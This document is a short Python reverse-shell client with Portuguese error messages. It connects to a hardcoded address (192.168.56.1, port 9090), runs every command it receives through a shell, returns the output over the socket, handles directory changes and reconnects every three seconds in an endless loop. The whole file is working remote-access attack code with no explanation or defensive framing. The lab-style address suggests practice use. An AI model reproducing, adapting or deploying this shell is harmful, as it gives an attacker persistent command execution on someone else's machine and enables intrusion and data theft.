import socket, subprocess, time, os

HOST = '192.168.56.1'
PORT = 9090


def cmd(client_socket: socket, data: str) -> None:
    try:
        process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        response = output+error
        client_socket.sendall(response)
    except Exception as e:
        print(f'Erro cmd(): {e}')


def connect(HOST: str, PORT: int) -> socket:
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))
        return client_socket
    except Exception as e:
        print(f'Erro connect(): {e}')
        


def cli(client_socket: socket) -> None:
    while True:

        try:
            raw = client_socket.recv(1024)
            data = raw.decode().strip()

            if not raw:
                break
            if data == "":
                continue

            elif data.startswith('cd '):
                directory = data[3:].strip()
                try:
                    os.chdir(directory)
                except Exception as e:
                    print(f'Erro cli(): {e}')
                continue

            cmd(client_socket, data)
        except Exception as e:
            print(f'Erro cli(): {e}')
            break

if __name__ == "__main__":
    while True:
        try:
            client = connect(HOST, PORT)
        except Exception as e:
            print(e)
            break
       
        if client:
            cli(client)
        time.sleep(3)
        
